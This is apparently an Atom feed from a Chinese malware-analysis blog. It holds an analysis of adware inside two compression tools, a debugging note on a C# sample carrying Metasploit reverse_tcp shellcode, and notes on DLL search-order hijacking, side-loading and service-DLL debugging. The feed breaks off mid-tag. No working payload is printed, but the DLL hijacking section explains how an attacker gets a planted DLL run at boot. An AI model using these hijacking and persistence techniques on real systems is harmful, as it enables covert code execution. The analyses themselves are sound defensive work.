<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Risks&#39;s blog</title>
  
  
  <link href="http://risks255.github.io/atom.xml" rel="self"/>
  
  <link href="http://risks255.github.io/"/>
  <updated>2021-02-03T11:51:59.656Z</updated>
  <id>http://risks255.github.io/</id>
  
  <author>
    <name>Risks</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>流氓广告的分析与研究</title>
    <link href="http://risks255.github.io/2021/02/01/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/"/>
    <id>http://risks255.github.io/2021/02/01/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/</id>
    <published>2021-02-01T11:54:23.000Z</published>
    <updated>2021-02-03T11:51:59.656Z</updated>
    
    <content type="html"><![CDATA[<p>大家使用电脑时，装机必备软件肯定少不了压缩工具，但使用压缩软件时，你们有没有发现他们都有同样的毛病？可恶的流氓广告！你是否和笔者一样有着以下这些烦恼：电脑开机时，迎接你的总是任务栏上莫名弹出的各种广告；经常发现电脑桌面上不知何时悄无声息的出现了各种图标；或者更令人爆炸的是玩游戏或者全屏投影的时候弹窗广告强行把你切回桌面等等。而这些其实都是由于商业公司往往会瞄准一些存在开源方案的软件，一拥而上，用开源代码改造出带恶意弹窗推广的流氓软件。</p><p>流氓软件是介于病毒和正规软件之间的软件，多半都是在用户不知情的情况下载安装的。“流氓软件”不仅会影响我们的日常办公，而且还会劫持你的电脑，篡改你的网站主页，甚至还会收集、追踪你的个人信息进行利用和推广；让人感到无比恶心的同时有的还拿它没辙。很不幸，压缩软件正是流氓软件中的典型之一。目前，流氓广告推广成为多数用户的烦恼，通过对压缩类流氓广告的样本分析发现，这些让人束手无策又抓狂的弹窗广告已成为日常。</p><h2 id="一、详细分析"><a href="#一、详细分析" class="headerlink" title="一、详细分析"></a>一、详细分析</h2><p>根据最近捕获的病毒样本数据统计，感染量前50的病毒中流氓软件占比较大，而压缩软件正是流氓软件中的典型之一，所以本文将带大家一起分析两款典型的带有流氓广告的压缩软件，分别是XinSu安装包（1.0.5.20331版本）和KuaiZi(快压)检查更新程序UpdateChecker（1.0.5.1版本）。</p><p>XinSu安装包是最近非常活跃的带有流氓广告的软件之一，是压缩软件新速压缩的安装包，该软件被众多使用者指出在开机之后会弹出大量低俗的弹窗广告，并且安全研究者发现该软件中内置了后门程序用来收集用户浏览器历史记录等信息。</p><p>而UpdateChecker程序是压缩软件快压的检测更新程序，版本1.0.5.1。该软件负责快压中的广告弹窗。快压程序安装时，会在安装目录的x86目录下释放一个UpdateChecker.exe的流氓软件，文件描述为“快压检查更新程序”。但实际上该程序运行时会下载并执行对应的广告程序，导致出现大量的广告弹窗。</p><p>下面就对这两种带有流氓广告的压缩软件进行分析。</p><h3 id="（一-XinSu分析"><a href="#（一-XinSu分析" class="headerlink" title="（一)XinSu分析"></a>（一)XinSu分析</h3><p>首先，第一步是创建服务，并设置其为默认解压软件；然后，通过分析该安装包各个安装进程之间的层层关系，获得关系示意图如下图所示：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image002.jpg"></p><p>其中，服务进程Secat通过参数启动了Yematou.exe进程；通过动态调试分析能得到，Yematou通过CreateProcessW来创建子进程Loruly；Yematou随后退出，也导致了Loruly没有父进程；Loruly通过参数启动了Furtler、Xsmn、Xstp等进程，自此，进程间的关系就弄清楚了。</p><p>通过对Loruly的分析，发现了启动进程的参数情况:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image004.jpg"></p><p>通过已有的分析情况来看，新速压缩中的后门程序主要分为两个部分，云控主程序Loruly.exe和加载信息收集云控模块Furtler.exe（详细情况可参考链接 <a href="https://www.huorong.cn/info/1592489908487.html">火绒</a>）。所以在XinSu安装包的所有进程中Loruly和Furtler相对更为重要，接下来将这两个模块单独提出来做进一步分析。</p><h4 id="1、Loruly进程分析"><a href="#1、Loruly进程分析" class="headerlink" title="1、Loruly进程分析"></a>1、Loruly进程分析</h4><p>（1）使用wireshark工具连接106.75.97.222的80端口，抓取报文如下：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image006.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image008.jpg"></p><p>（2）然后连接58.216.21.226的80端口，抓取报文如下</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image010.jpg"></p><p>（3）发现恶意模块Loruly.exe运行之后，会通过http请求来访问down.zhilingshidai.com下载并解密文件</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image012.jpg"></p><p>（4）通过第一次解密，我们得到了一个xml的相关信息:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image014.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image016.gif" alt="image007.png"></p><p>（5）解密被加密的7z数据，用于之后解密为pe文件:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image018.jpg"></p><p>（6）解密得到pe文件，并对pe文件头做校验:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image020.jpg"></p><p>（7）并且将pe文件位置进行了调整，0x22E0000为解密出pe文件的地址，0x10000000为新分配的内存，用于之后的文件调用,0x203000为另一个pe的地址:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image022.jpg"></p><p>（8）该pe文件是一个dll文件，并且拥有三个导出函数，地址分别是0x100011b0，0x100011d0和0x100011c0:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image024.jpg"></p><p>（9）其中eax+0x90为0x100011b0，edx+0x90为0x100011d0，ecx+0x90为0x100011c0，用于调用dll的导出函数:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image026.jpg"></p><p>（10）执行dll代码，加载dll文件的资源段，得到加密的数据，解密后得到一个pe文件:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image028.jpg"></p><p>（11）保存压缩包数据，解压得知该dll名为BrowserLink.dll:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image030.jpg"></p><p>（12）该dll用以获取后续云端加密配置文件信息，并解密出配置信息（图片引用于<a href="https://www.huorong.cn/info/1592489908487.html">https://www.huorong.cn/info/1592489908487.html</a>):</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image032.gif" alt="image012.png"></p><p>（13）带参启动Furtler进程，参数为xml的配置数据:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image033.jpg"></p><h4 id="2、Furtler进程"><a href="#2、Furtler进程" class="headerlink" title="2、Furtler进程"></a>2、Furtler进程</h4><p>（1）Furtler进程同样存在文件解密的操作，Furtler.exe会根据其参数中的网址去下载执行远程加密模块jp_zgzs.dll的“Run”导出函数。解密过程和Loruly采用同样的解密方式:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image035.jpg"></p><p>（2）得到解压文件后发现是一个名为wp2_zgzs.dll，存在Run等相关导出函数:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image037.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image039.jpg"></p><p>（3）循环寻找导出函数Run:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image041.jpg"></p><p>（4）eax的地址为Run的地址，用于调用Run函数:</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image043.jpg"></p><h4 id="3、小结"><a href="#3、小结" class="headerlink" title="3、小结"></a>3、小结</h4><p>在%appdata%\LocalLow目录下发现了关于gif文件和xml文件等特殊文件，目录情况如下所示，其中包含了下载链接提及的syt.gif、zsw.gif和zsw2.gif：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image045.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image047.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image049.jpg"></p><p>如果大家想了解XinSu压缩更多分析结果可参考：<a href="https://www.huorong.cn/info/1592489908487.html">https://www.huorong.cn/info/1592489908487.html</a></p><h3 id="（二-UpdateChecker分析"><a href="#（二-UpdateChecker分析" class="headerlink" title="（二) UpdateChecker分析"></a>（二) UpdateChecker分析</h3><p>该程序为快压的检测更新程序，版本1.0.5.1。UpdateChecker.exe的文件描述为“快压检查更新程序”，文件属性，如下图所示：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image051.jpg"></p><p>经过对其数字签名的校验，发现该数字签名真实并有效，同时使用了网上已有的验证签名的方法进行验证：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image053.jpg"></p><h4 id="1、UpdateChecker进程"><a href="#1、UpdateChecker进程" class="headerlink" title="1、UpdateChecker进程"></a>1、UpdateChecker进程</h4><p>（1）通过进程树可以发现，UpdateChecker启动了一个广告进程，并弹出了相关广告提示框：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image055.jpg"></p><p>（2）通过对UpdateChecker进行调试分析发现，UpdateChecker会下载文件并保存在本地，主要有%appdata%\kuaiya和%appdata%\kuaizip两个目录，包含文件详情如下图所示：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image057.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image059.jpg"></p><p>（3）UpdateChecker还通过CreateFileW函数来创建文件：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image061.jpg"></p><p>（4）使用CreateProcessA来启动对应目录下的可执行文件：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image063.jpg"></p><p>（5）通过同样的方式将其他的几个文件下载回来，以其中一个为例子，详细如下图所示：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image065.jpg"></p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image067.jpg"></p><p>（6）通过对启动参数的寻找，终于在代码中找到了解密数据的部分，并且解密xml代码多次被调用用于解密之后的多个xml配置文件，通过xml的解密函数，将加密数据解密为可见的xml数据：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image069.jpg"></p><p>（7）将解密后的xml数据，整理归档：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image071.jpg"></p><p>（8）urls的xml信息，主要配置了要连接的xml信息：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image073.jpg"></p><p>（9）杀软.xml配置，主要涉及弹窗广告部分，还带有对部分杀软的检测：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image075.jpg"></p><p>（10）其余xml大多是用来配置下载文件的配置和其他相关信息，这里以kuaiyaminixktt为例子，我们看一下xml的具体内容：</p><p><img src="/img/%E6%B5%81%E6%B0%93%E5%B9%BF%E5%91%8A%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E7%A0%94%E7%A9%B6/clip_image077.jpg"></p><p>（11）下载完对应的文件并弹出广告窗口之后，UpdateChecker进程退出，自此UpdateChecker的分析就到此为止。</p><h4 id="2、小结"><a href="#2、小结" class="headerlink" title="2、小结"></a>2、小结</h4><p>相对于XinSu的隐秘性，UpdateChecker无疑更为大胆，直接将文件下回到本地执行，并且传输的PE文件未进行任何加密处理，可以通过流量直接识别。</p><h2 id="二、处置建议"><a href="#二、处置建议" class="headerlink" title="二、处置建议"></a>二、处置建议</h2><p>那么，重点来了！如何让电脑清净起来呢？本文以两款压缩软件为例，介绍了相关流氓广告是何如被执行的，在这里笔者给出大家几点建议：</p><p>1、常用软件尽量在官网下载。</p><p>2、不要使用下载网站的高速下载，多数情况会被捆绑下载垃圾文件全家桶。</p><p><strong>如果已经遇到了流氓广告骚扰，大家可以自行使用Autoruns和Procexp对广告进程和服务进行甄别。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大家使用电脑时，装机必备软件肯定少不了压缩工具，但使用压缩软件时，你们有没有发现他们都有同样的毛病？可恶的流氓广告！你是否和笔者一样有着以下这些烦恼：电脑开机时，迎接你的总是任务栏上莫名弹出的各种广告；经常发现电脑桌面上不知何时悄无声息的出现了各种图标；或者更令人爆炸的是玩</summary>
      
    
    
    
    <category term="样本相关" scheme="http://risks255.github.io/categories/%E6%A0%B7%E6%9C%AC%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="Adware" scheme="http://risks255.github.io/tags/Adware/"/>
    
  </entry>
  
  <entry>
    <title>C#调试踩过的坑</title>
    <link href="http://risks255.github.io/2021/01/27/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/"/>
    <id>http://risks255.github.io/2021/01/27/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/</id>
    <published>2021-01-27T04:19:13.000Z</published>
    <updated>2021-02-03T11:38:54.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="C-踩坑记录"><a href="#C-踩坑记录" class="headerlink" title="C#踩坑记录"></a>C#踩坑记录</h2><p>最近刚好遇到了一些关于C#程序的调试，正好又有些不太记得dnspy的用法了，遂进行动态调试却发现了一些有趣的问题。</p><p>使用Dnspy加载程序看到了奇怪的东西，并非是以往常见的C#结构，而是出现的JS Module，应该是引用了JS相关代码。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6.png"></p><p>在ShellCodeExec部分发现了shellcode。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E5%8F%91%E7%8E%B0shellcode.png"></p><p>对其进行base64解密并使用自写的加载器读取文件内容，发现很像msf生成的payload。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/load%E5%8A%A0%E8%BD%BD.png"></p><p>本以为此次调试应该就到此为止了，没想到，想不到，居然出现了异常。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E5%AD%98%E5%9C%A8%E5%BC%82%E5%B8%B8.png"></p><p>一度以为这是代码加了反调试，看着多余的部分有点像花指令，便想着如何去除花指令，但是最后都没有结果。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E7%96%91%E4%BC%BC%E8%8A%B1%E6%8C%87%E4%BB%A4.png"></p><p><strong>无奈之下又回到了Dnspy调试C#程序，一路调试发现和之前预料的一样，就是这段shellcode但是为什么无法直接调试呢？</strong></p><p><strong>但是！！！</strong></p><p><strong>发现Dnspy好像不像OD一样可以直接跳转到对应的API调用，找到了CreateThread的调用，但是无法进行线程调试。</strong></p><p><strong>当时我人就傻眼了。于是便陷入了死循环浪费了不少时间。</strong></p><p><strong>直到后面我发现了一个内存地址，便使用OD附加了进程，跳转到了对应的内存发现了不得了的东西。</strong></p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80.png"></p><p>疑似shellcode的一部分代码。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E7%96%91%E4%BC%BCshellcode.png"></p><p>于是在头部下好断点让程序跑起来，中断在断点位置。</p><p>第一个loop用于解密当前所在位置的内容。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E7%AC%AC%E4%B8%80%E6%AE%B5%E8%87%AA%E4%BF%AE%E6%94%B9.png"></p><p>进入函数发现第二个loop，当解密出前6个字节时，我开始有点确信这是msf的reverse_tcp的payload了。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/%E7%AC%AC%E4%BA%8C%E6%AE%B5%E8%87%AA%E4%BF%AE%E6%94%B9.png"></p><p>直到最后完全解密完成，我确定这就是msf的reverse_tcp的payload了。</p><p><img src="/img/Csharp%E8%B0%83%E8%AF%95%E5%9D%91%E7%82%B9/msf%E7%9A%84reverstcp%E4%BB%A3%E7%A0%81.png"></p><p>看了整个内存的shellcode内容，发现一个问题为什么直接从C#中得到的解密base64和程序得到的结果不一致。</p><p>我想大概可能是制作者故意这样设计的吧。</p><h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><p>Dnspy作为C#调试软件，重要性无可厚非，但却存在一些不足。</p><p>比如无法跟踪API，无法跳转到内存，这些部分OD都可以帮助完成。</p><p><strong>记笔记，记笔记，记笔记，重要的话说三遍。</strong></p><p><strong>C#程序动态调试使用Dnspy，内存数据查看使用OD。</strong></p><p>基本上离成功就不远了。</p><p>——敬被坑的我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;C-踩坑记录&quot;&gt;&lt;a href=&quot;#C-踩坑记录&quot; class=&quot;headerlink&quot; title=&quot;C#踩坑记录&quot;&gt;&lt;/a&gt;C#踩坑记录&lt;/h2&gt;&lt;p&gt;最近刚好遇到了一些关于C#程序的调试，正好又有些不太记得dnspy的用法了，遂进行动态调试却发现了一些有趣的</summary>
      
    
    
    
    <category term="Csharp" scheme="http://risks255.github.io/categories/Csharp/"/>
    
    
    <category term="Csharp踩坑" scheme="http://risks255.github.io/tags/Csharp%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>DLL相关技术</title>
    <link href="http://risks255.github.io/2021/01/19/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
    <id>http://risks255.github.io/2021/01/19/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/</id>
    <published>2021-01-19T07:46:44.000Z</published>
    <updated>2021-01-31T03:03:43.884Z</updated>
    
    <content type="html"><![CDATA[<h2 id="VS导出函数"><a href="#VS导出函数" class="headerlink" title="VS导出函数"></a>VS导出函数</h2><h3 id="使用def文件"><a href="#使用def文件" class="headerlink" title="使用def文件"></a>使用def文件</h3><pre><code>LIBRARY   EXPORTS    name @numer</code></pre><h3 id="使用extern"><a href="#使用extern" class="headerlink" title="使用extern"></a>使用extern</h3><pre><code>extern &quot;C&quot;表示以C函数来调用而不是C++.c调用c函数#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* *................................. * do something here *.................................*/#ifdef __cplusplus&#125;#endif.cpp调用c函数extern &quot;C&quot;&#123;/* *................................. * do something here *.................................*/&#125;</code></pre><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>​        dll搜索劫持技术是一种简单的dll注入技术，他利用windows加载dll目录的优先级来加载dll。他不需要通过修改注册表或者修改二进制文件的前提下注入dll的。下面是windows加载dll的默认搜索顺序：</p><pre><code>1.加载应用程序的目录2.当前目录【经常利用到】3.系统目录（../windows/system32）4.16位子系统目录（../windows/system）5.windows目录（../windows）6.PATH环境变量列举的目录说明：为了安全和加载速度，windows会在HKML\System\CurrentSet\SessionManger\SafeDll\SafeDllSearchMode下创建键值系统会优先加载这些已知的dll(第一位)我们在通过两个方面来进行劫持：1.通过在上述注册表中添加恶意dll路径的键值，这样使得恶意dll优先注入到进程空间（这个恶意dll需要和系统dll同名）2.在加载系统dll之前加载，有权访问文件系统的攻击者可能会将恶意ntshrui.dll放在C：\ Windows目录中。该DLL通常驻留在System32文件夹中，进程explorer.exe也驻留在c:\Windows中。一旦尝试从System32文件夹中加载ntshrui.dll，实际上会由于优先搜索顺序而加载由攻击者提供的DLL。由于攻击者已将其恶意ntshrui.dll放入与加载explorer.exe进程相同的目录中。因此将首先找到攻击者提供的DLL，从而加载代替合法DLL。由于explorer.exe在引导周期内被加载，攻击者的恶意软件被保证执行。【不上书上说的../windows比系统目录优先搜索，而是当前目录比系统目录被优先搜索】如果启用windows的Dll的安全检查，情况可能会大有改观。启用&quot;安全DLL查找模式&quot;时，查找顺序如下：1.应用程序所在目录；2.系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；3.16位系统目录4.Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；5.当前目录。GetCurrentDirectory返回的目录；6.环境变量PATH中所有目录。</code></pre><h2 id="DLL-SIDE-LOADING"><a href="#DLL-SIDE-LOADING" class="headerlink" title="DLL SIDE-LOADING"></a>DLL SIDE-LOADING</h2><pre><code>APT组织常用，即所谓白+黑技术</code></pre><h2 id="服务DLL调试"><a href="#服务DLL调试" class="headerlink" title="服务DLL调试"></a>服务DLL调试</h2><p><strong>第一种推荐的方式 修改OEP。</strong></p><p>原始的函数信息</p><p>5FF75670 &gt;  55              push ebp<br>5FF75671    8BEC            mov ebp,esp<br>5FF75673    83EC 3C         sub esp,3C<br>5FF75676    A1 0880F85F     mov eax,dword ptr ds:[5FF88008]</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%8E%9F%E5%A7%8BOEP.png"></p><p>修改后的函数信息</p><p>原始操作字节码 EB FE 90</p><p>5FF75670 &gt;- EB FE           jmp short Microsof.ServiceMain<br>5FF75672    90              nop<br>5FF75673    83EC 3C         sub esp,3C<br>5FF75676    A1 0880F85F     mov eax,dword ptr ds:[5FF88008]</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84OEP.png"></p><p><strong>通过调试器附加相应的进程来完成相关调试，不太好使容易出现卡死的状态，导致系统不稳定。</strong></p><p><strong>第二种推荐的方式，利用映像劫持</strong></p><p>主要涉及修改注册表相关信息和配置修改问题</p><p>首先开启服务的交互选项，勾选“允许服务与桌面交互”的选项。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%85%81%E8%AE%B8%E6%9C%8D%E5%8A%A1%E4%BA%A4%E4%BA%92.png"></p><p>在服务管理器中启动Interactive Services Detection，默认是关闭的。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E9%BB%98%E8%AE%A4%E5%85%B3%E9%97%AD.png"></p><p>修改Interactive Services Detection服务的启动方式并启动该服务。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%90%AF%E4%BA%A4%E4%BA%92%E9%80%9A%E7%9F%A5%E6%9C%8D%E5%8A%A1.png"></p><p>通过服务定位到注册表位置</p><p>修改ImagePath的svchost为scvhost(多么鸡贼的想法，我怎么就没想到呢~，失误，失误)，这样可以防止意外重启导致计算机无法正常开机，并且由于scvhost服务众多，容易出现错误调试的情况，修改名字后可以定位到唯一的服务更加准确，<strong>记得在修改完成后复制一个svchost并改名为scvhost。</strong></p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E4%BF%AE%E6%94%B9svchost.png"></p><p>主键 HKEY_LOCAL_MACHINE</p><p>子键 SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</p><p>添加新的子项scvhost.exe 创建字符串数值debugger 设置调试器的信息</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E8%AE%BE%E7%BD%AE.png"></p><p>点击启动服务时，弹出交互式提示，点击查看消息即可。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%BC%B9%E5%87%BA%E4%BA%A4%E4%BA%92%E4%BF%A1%E6%81%AF.png"></p><p>成功进入到交互式调试。</p><p><strong>但是这样存在一个问题，调试时截图不方便并且调试时界面有些过于丑陋(嫌弃这种风格)。</strong></p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E8%BF%9B%E5%85%A5%E4%BA%A4%E4%BA%92%E8%B0%83%E8%AF%95%E7%8A%B6%E6%80%81.png"></p><p>并且由于有些服务会检测父进程是否是Services服务，交互式调试父进程是调试器本身，所以在调试某些服务会出现一些问题，比如wannamine4.0服务就存在这样的校验。</p><p><strong>于是我想到了把映像劫持使用的修改名字的方法用到修改OEP上面，并且想到了解决卡顿的问题(进程启动后暂停进程即可，我可真是个小机灵鬼)。</strong></p><p>首先还是先完成服务的修改，这样便于更清楚的看到相关的进程情况。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E4%BF%AE%E6%94%B9svchost.png"></p><p>启动服务，通过procexp进程查看器，对该进程进行挂起操作。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E6%8C%82%E8%B5%B7%E8%BF%9B%E7%A8%8B.png"></p><p>通过调试器附加，可以清楚地看到scvhost.exe不同于svchost.exe</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E9%99%84%E5%8A%A0scvhost.png"></p><p>内存搜索EB FE 90，定位到导出函数的位置。</p><p><img 